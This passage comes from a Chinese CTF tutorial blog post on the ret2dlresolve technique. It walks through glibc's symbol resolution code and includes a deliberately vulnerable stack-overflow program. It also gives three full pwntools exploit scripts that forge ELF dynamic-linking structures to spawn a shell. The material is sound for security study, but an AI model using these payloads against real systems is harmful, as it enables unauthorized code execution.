ELF_MACHINE_JMP_SLOT);  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not </span></span><br><span class="line"><span class="comment">       used don&#x27;t look in the global scope.  */</span>  </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>) &#123;  </span><br><span class="line">        <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> =</span> <span class="literal">NULL</span>;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>) &#123;  </span><br><span class="line">            <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>=  </span><br><span class="line">                (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);  </span><br><span class="line">            ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;  </span><br><span class="line">            version = &amp;l-&gt;l_versions[ndx];  </span><br><span class="line">            <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)  </span><br><span class="line">                version = <span class="literal">NULL</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">/* We need to keep the scope around so do some locking.  This is </span></span><br><span class="line"><span class="comment">        not necessary for objects which cannot be unloaded or when </span></span><br><span class="line"><span class="comment">         we are not using any threads (yet).  */</span>  </span><br><span class="line">        <span class="keyword">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;  </span><br><span class="line">        <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P) &#123;  </span><br><span class="line">            THREAD_GSCOPE_SET_FLAG ();  </span><br><span class="line">            flags |= DL_LOOKUP_GSCOPE_LOCK;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL  </span></span><br><span class="line">        RTLD_ENABLE_FOREIGN_CALL;  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  </span></span><br><span class="line">        <span class="comment">//根据符号名,搜索对应的函数，返回libc基地址，并将符号信息保存到sym中   </span></span><br><span class="line">        result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,  </span><br><span class="line">                                      version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">/* We are done with the global scope.  */</span>  </span><br><span class="line">        <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)  </span><br><span class="line">            THREAD_GSCOPE_RESET_FLAG ();  </span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL  </span></span><br><span class="line">        RTLD_FINALIZE_FOREIGN_CALL;  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  </span></span><br><span class="line">  </span><br><span class="line">        <span class="comment">//得到结果   </span></span><br><span class="line">        value = DL_FIXUP_MAKE_VALUE (result,  </span><br><span class="line">                                     sym ? (LOOKUP_VALUE_ADDRESS (result)  </span><br><span class="line">                                            + sym-&gt;st_value) : <span class="number">0</span>);  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="comment">/* We already found the symbol.  The module (and therefore its load </span></span><br><span class="line"><span class="comment">        address) is also known.  */</span>  </span><br><span class="line">        value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);  </span><br><span class="line">        result = l;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* And now perhaps the relocation addend.  */</span>  </span><br><span class="line">    value = elf_machine_plt_value (l, reloc, value);  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (sym != <span class="literal">NULL</span>  </span><br><span class="line">            &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))  </span><br><span class="line">        value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* Finally, fix up the plt itself.  */</span>  </span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))  </span><br><span class="line">        <span class="keyword">return</span> value;  </span><br><span class="line">    <span class="comment">//将结果写回到got表中   </span></span><br><span class="line">    <span class="keyword">return</span> elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>根据源码内容可以看出来解析时是根据符号名的字符串来解析函数的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span>  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">()</span></span>&#123;  </span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">0x20</span>];  </span><br><span class="line">    read(<span class="number">0</span>,buffer,<span class="number">0x200</span>);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;  </span><br><span class="line">    fun();  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="comment">// gcc test.c -z norelro -no-pie -fno-stack-protector -m32 -o ret2dlsolve2  </span></span><br></pre></td></tr></table></figure><p>现在我们创建这样一个漏洞程序。</p><p>在NO_RELRO情况下，因为dynamic可以修改，因此，我们直接修改dynamic的strtab，将它指向我们可控的区域，然后在可控区域对应的位置布置下需要的函数的名字即可，即伪造dynstr。</p><p><img src="/images/image-20220203130733878.png" alt="image-20220203130733878"></p><p>可以看到上面是有可读可写的权限的。</p><p><img src="/images/image-20220203131754166.png" alt="image-20220203131754166"></p><p>指向的位置存在这样几个字符串。</p><p>exp如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./ret2dlsolve2&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2dlsolve2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_ebp = <span class="number">0x0804848b</span></span><br><span class="line">leave_ret = <span class="number">0x08048358</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_plt_load = elf.plt[<span class="string">&#x27;read&#x27;</span>]+<span class="number">6</span></span><br><span class="line">bss = elf.bss()</span><br><span class="line">target = <span class="number">0x804961C</span>+<span class="number">4</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x28</span>+<span class="number">0x4</span>)+p32(pop_ebp)+p32(bss+<span class="number">0x300</span>) + \</span><br><span class="line">    p32(read_plt)+p32(leave_ret)+p32(<span class="number">0</span>)+p32(bss+<span class="number">0x300</span>)+p32(<span class="number">0x1000</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">fake_str = <span class="string">b&#x27;\x00libc.so.6\x00_IO_stdin_used\x00system\x00&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4</span>+p32(read_plt)+p32(read_plt_load) + \</span><br><span class="line">    p32(<span class="number">0</span>)+p32(target)+p32(<span class="number">0x100</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x50</span>, <span class="string">b&#x27;\x00&#x27;</span>)+fake_str</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload = p32(bss+<span class="number">0x350</span>)+<span class="string">b&#x27;;sh&#x27;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>64位相较于32位比较类似，又因为参数是在寄存器内保存的所以，直接一次ROP即可解决。</p><h3 id="PARTIAL-RELRO"><a href="#PARTIAL-RELRO" class="headerlink" title="PARTIAL_RELRO"></a>PARTIAL_RELRO</h3><p>首先再更深层次的观察_dl_runtime_resolve函数的作用。</p><p><img src="/images/image-20220203144803843.png" alt="image-20220203144803843"></p><p>这一步和上面一样，但是上面没有提到这两个push的作用，先继续往后看。</p><p><img src="/images/image-20220203144853692.png" alt="image-20220203144853692"></p><p>上面的0是reloc_arg，下面的0xf7ffd918则是link_map的地址。</p><p><img src="/images/image-20220203145142419.png" alt="image-20220203145142419"></p><p>通过这个地址即可找到.dynamic的地址，也就是上图中的第三个</p><blockquote><p>.dynamic：是ld.so使用的动态链接信息，在/etc/ld.so.conf文件中存放着需要动态加载的目录，使用ldconfig就可以将ld.so.conf中的指定目录的库文件加载到内存中，并记录在/etc/ld.so.cache文件中。ld.so.1文件就可以在高速缓存中访问动态库文件，提高访问速度。导入动态链接库，可以在/etc/ld.so.conf文件中配置，或者使用LD_LIBRARY_PATH环境变量进行引用。</p></blockquote><p>再根据.dynamic的地址找到另外几个结构的地址</p><p><img src="/images/image-20220203145416583.png" alt="image-20220203145416583"></p><p>其中的地址信息是:</p><p>.dynstr 的地址是 .dynamic + 0x44 -&gt; 0x0804821c</p><blockquote><p><strong>.dynstr</strong>：动态链接的字符串表，保存动态链接所需的字符串。比如符号表中的每个符号都有一个 st_name(符号名)，他是指向字符串表的索引，这个字符串表可能就保存在 .dynstr，而.dynstr结构为正常的字符串数组。</p></blockquote><p>.dynsym 的地址是 .dynamic + 0x4c -&gt; 0x080481cc</p><blockquote><p><strong>.dynsym</strong>：动态链接的符号表，保存需要动态连接的符号表，而.dynsym结构如下</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    st_name; <span class="comment">//符号名相对.dynstr起始的偏移  </span></span><br><span class="line">  Elf32_Addr    st_value;</span><br><span class="line">  Elf32_Word    st_size;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;</span><br><span class="line">  Elf32_Section st_shndx;</span><br><span class="line">&#125;Elf32_Sym; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>.rel.plt 的地址是 .dynamic + 0x84 -&gt; 0x08048298</p><blockquote><p><strong>.rel.plt</strong>：节的每个表项对应了所有外部过程调用符号的重定位信息。而.rel.plt结构如下</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">  Elf32_Addr r_offset;<span class="comment">//指向GOT表的指针，即该函数在got表的偏移</span></span><br><span class="line">  Elf32_Word r_info;</span><br><span class="line">&#125;Elf32_Rel</span><br></pre></td></tr></table></figure><p>.rel.plt 的地址加上参数 reloc_arg，即 0x08048298 + 0 -&gt; 0x08048298</p><p>找到的就是函数的重定位表项 Elf32_Rel 的指针，记作 rel</p><p><img src="/images/image-20220203150027635.png" alt="image-20220203150027635"></p><p>通过rel就可以获得Elf32_Rel结构体的数据</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r_offset=<span class="number">0x0804a00c</span>;</span><br><span class="line">r_info=<span class="number">0x00000107</span>;</span><br></pre></td></tr></table></figure><p>将r_info&gt;&gt;8得到4也就得到了.dynsym中的下标。</p><p><img src="/images/image-20220203150547259.png" alt="image-20220203150547259"></p><p>从上往下从0开始，找到与下标相同的行获得第一列的数据根据即为name_offset</p><p><img src="/images/image-20220203163308304.png" alt="image-20220203163308304"></p><p>为什么是第一列是因为第一列的值其实就是上面写的偏移</p><p>再根据.dynstr+name_offset获得函数名的字符串。</p><p><img src="/images/image-20220203150933860.png" alt="image-20220203150933860"></p><p>最后再根据得到的字符串来执行函数。</p><h4 id="梳理一下"><a href="#梳理一下" class="headerlink" title="梳理一下"></a>梳理一下</h4><p>1.首先push两个参数进入，随后执行_dl_runtime_resolve</p><p>2.根据link_map找到.dynamic地址</p><p>3.根据.dynamic找到.dynstr    .dynsym     .rel.plt</p><p>4.根据reloc_arg找到Elf32_Rel的指针rel</p><p>5.拿到r_info经过移位拿到index</p><p>6.根据index拿到name_offset结合.dynstr计算出函数的名字</p><blockquote><p>rel_addr = .rel.plt_addr + reloc_arg</p><p>fake_rel_addr = .rel.plt_addr + fake_reloc_arg</p><p><strong>fake_reloc_arg = fake_rel_addr - rel_addr + reloc_arg</strong></p><p>根据以上简单的运算就可以实现伪造rel的地址</p></blockquote><blockquote><p>name_offset_addr=((r_info - 0x7)&gt;&gt;8)*0x10+.dynsym_addr</p><p>fake_name_offset_addr=((r_info - 0x7)&gt;&gt;8)*0x10+fake_dynsym_addr</p><p><strong>r_info = (((fake_dynsym_addr - .dynsym_addr) / 16) &lt;&lt; 8) + 0x7</strong></p><p>这里伪造出rel当中的r_info的值</p></blockquote><blockquote><p>根据上面ida调试的截图很容易可以看出来dynsym的伪造很简单只需要按照原本的模式写就行</p><p><strong>fake_dynsym = p32(system_str - dynstr_addr)+p32(0)+p32(0)+p8(0x12)+p8(0)+p16(0)</strong></p></blockquote><p>最终构造exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./ret2dlsolve&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2dlsolve&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_load_plt = <span class="number">0x80482d0</span></span><br><span class="line">leave_ret = <span class="number">0x08048378</span></span><br><span class="line">pop_ebp = <span class="number">0x080484ab</span></span><br><span class="line">dynstr_addr = <span class="number">0x0804821c</span></span><br><span class="line">dynsym_addr = <span class="number">0x080481cc</span></span><br><span class="line">rel_addr = <span class="number">0x08048298</span></span><br><span class="line">bss = elf.bss()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x28</span>+<span class="number">0x4</span>)+p32(pop_ebp)+p32(bss+<span class="number">0x800</span>) + \</span><br><span class="line">    p32(read_plt)+p32(leave_ret)+p32(<span class="number">0</span>)+p32(bss+<span class="number">0x800</span>)+p32(<span class="number">0x1000</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_dynsym_addr = bss+<span class="number">0x910</span></span><br><span class="line">system_str = bss+<span class="number">0x900</span></span><br><span class="line"></span><br><span class="line">fake_rel = p32(read_got) + \</span><br><span class="line">    p32((((fake_dynsym_addr - dynsym_addr) // <span class="number">16</span>) &lt;&lt; <span class="number">8</span>) + <span class="number">0x7</span>)</span><br><span class="line">fake_dynsym = p32(system_str - dynstr_addr)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p8(<span class="number">0x12</span>)+p8(<span class="number">0</span>)+p16(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_rel_addr = fake_dynsym_addr+<span class="built_in">len</span>(fake_dynsym)</span><br><span class="line">bin_sh_addr = bss+<span class="number">0x900</span>+<span class="built_in">len</span>(<span class="string">b&#x27;system\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4</span>+p32(read_load_plt)+p32(fake_rel_addr -</span><br><span class="line">                                          rel_addr)+p32(<span class="number">0</span>)+p32(bin_sh_addr)</span><br><span class="line">payload += payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>) + \</span><br><span class="line">    <span class="string">b&#x27;system\x00/bin/sh&#x27;</span>.ljust(<span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += fake_dynsym+fake_rel</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>下面是64位的情况，64位不能直接伪造rel.plt</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>) </span><br><span class="line">  &#123; </span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>=(<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]); </span><br><span class="line">    ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>; </span><br><span class="line">    version = &amp;l-&gt;l_versions[ndx]; </span><br><span class="line">    <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>) </span><br><span class="line">      version = <span class="literal">NULL</span>; </span><br><span class="line">  &#125; </span><br></pre></td></tr></table></figure><p><strong>这里，出现了访问未映射的内存，主要原因就是reloc-&gt;r_info过大，bss段一般所在位置在0x600000然而真正的rel.plt一般在0x400000。</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>) &#123;  </span><br><span class="line">        ...  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="comment">/* We already found the symbol.  The module (and therefore its load </span></span><br><span class="line"><span class="comment">        address) is also known.  */</span>  </span><br><span class="line">        value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);  </span><br><span class="line">        result = l;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>解决办法是绕过这个if判断进入else。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>  </span></span><br><span class="line"><span class="class">&#123;</span>  </span><br><span class="line">  Elf64_Word    st_name;        <span class="comment">/* Symbol name (string tbl index) */</span>  </span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info;        <span class="comment">/* Symbol type and binding */</span>  </span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;       <span class="comment">/* Symbol visibility */</span>  </span><br><span class="line">  Elf64_Section st_shndx;       <span class="comment">/* Section index */</span>  </span><br><span class="line">  Elf64_Addr    st_value;       <span class="comment">/* Symbol value */</span>  </span><br><span class="line">  Elf64_Xword   st_size;        <span class="comment">/* Symbol size */</span>  </span><br><span class="line">&#125; Elf64_Sym;  </span><br></pre></td></tr></table></figure><p>如果我们伪造link_map，让sym-&gt;value为某一个已经解析了的函数地址，让l-&gt;addr为我们需要的函数地址到已知函数地址的偏移，那么l-&gt;l_addr + sym-&gt;st_value也就等于我们需要的函数地址。</p><p>比如，如果我们把read_got-8处当作sym那么sym-&gt;st_value也就等于read的地址，并且st_other正好也不为0，同时绕过了if，一举两得。</p><p>此时的rel结构为:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Addr        r_offset;                <span class="comment">/* Address */</span></span><br><span class="line">  Elf64_Xword        r_info;                        <span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">  Elf64_Sxword        r_addend;                <span class="comment">/* Addend */</span></span><br><span class="line">&#125; Elf64_Rela;</span><br><span class="line"><span class="comment">/* How to extract and insert information held in the r_info field.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_R_SYM(i)                        ((i) &gt;&gt; 32)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_R_TYPE(i)                        ((i) &amp; 0xffffffff)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_R_INFO(sym,type)                ((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type))</span></span><br></pre></td></tr></table></figure><p><img src="/images/image-20220203201328404.png" alt="image-20220203201328404"></p><p>在动态调试也可以看到raed在符号表中的偏移为1(0x100000007&gt;&gt;32)</p><p>还有注意的就是我们需要伪造这个数组里的几个指针，它们分别是</p><p>DT_STRTAB指针：位于link_map_addr +0x68(32位下是0x34)</p><p>DT_SYMTAB指针：位于link_map_addr + 0x70(32位下是0x38)</p><p>DT_JMPREL指针：位于link_map_addr +0xF8(32位下是0x7C)</p><p>(其实我也不知道怎么调用的system，我猜测是因为<code>DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);</code>这句话的原因吧，希望知道的大师傅可以评论一下)</p><p>综上得出exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./ret2dlsolve_64&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2dlsolve_64&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x00000000004005c3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x00000000004005c1</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_load_plt = <span class="number">0x4003f6</span></span><br><span class="line">bss = elf.bss()</span><br><span class="line"></span><br><span class="line">l_addr = libc.symbols[<span class="string">&#x27;read&#x27;</span>]-libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">r_offset = bss+<span class="number">0x200</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">0x8</span>)+p64(pop_rdi)+p64(<span class="number">0</span>) + \</span><br><span class="line">    p64(pop_rsi_r15)+p64(bss+<span class="number">0x100</span>)+p64(<span class="number">0</span>) + \</span><br><span class="line">    p64(read_plt)+p64(elf.symbols[<span class="string">&#x27;fun&#x27;</span>])</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">dynstr_addr = <span class="number">0x400318</span></span><br><span class="line">fake_link_map_addr = bss+<span class="number">0x100</span></span><br><span class="line">fake_strtab = p64(<span class="number">0</span>)+p64(dynstr_addr)</span><br><span class="line">fake_strtab_addr = fake_link_map_addr+<span class="number">0x8</span></span><br><span class="line"></span><br><span class="line">fake_symtab = p64(<span class="number">0</span>)+p64(read_got-<span class="number">0x8</span>)</span><br><span class="line">fake_symtab_addr = fake_strtab_addr+<span class="number">0x8</span>*<span class="number">2</span></span><br><span class="line"></span><br><span class="line">fake_dynrel_addr = fake_symtab_addr+<span class="number">0x8</span>*<span class="number">2</span></span><br><span class="line">fake_rel_addr = fake_dynrel_addr+<span class="number">0x8</span>*<span class="number">2</span></span><br><span class="line">fake_dynrel = p64(<span class="number">0</span>)+p64(fake_rel_addr)</span><br><span class="line">fake_rel = p64(r_offset)+p64(<span class="number">0x100000007</span>)+p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_link_map = p64(l_addr)+fake_strtab+fake_symtab+fake_dynrel+fake_rel</span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_link_map += p64(fake_strtab_addr)+p64(fake_symtab_addr)</span><br><span class="line">fake_link_map += <span class="string">b&#x27;/bin/sh&#x27;</span>.ljust(<span class="number">0x80</span>, <span class="string">b&#x27;\x00&#x27;</span>)+p64(fake_dynrel_addr)</span><br><span class="line">r.sendline(fake_link_map)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">0x8</span>)+p64(pop_rdi) + \</span><br><span class="line">    p64(fake_link_map_addr+<span class="number">0x78</span>)+p64(read_load_plt) + \</span><br><span class="line">    p64(fake_link_map_addr)+p64(<span class="number">0</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a class="link"   href="https://blog.csdn.net/seaaseesa/article/details/104478081" >https://blog.csdn.net/seaaseesa/article/details/104478081<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve/#second-try-no-leak" >https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve/#second-try-no-leak<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://blog.csdn.net/jzc020121/article/details/116312592#t3" >https://blog.csdn.net/jzc020121/article/details/116312592#t3<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
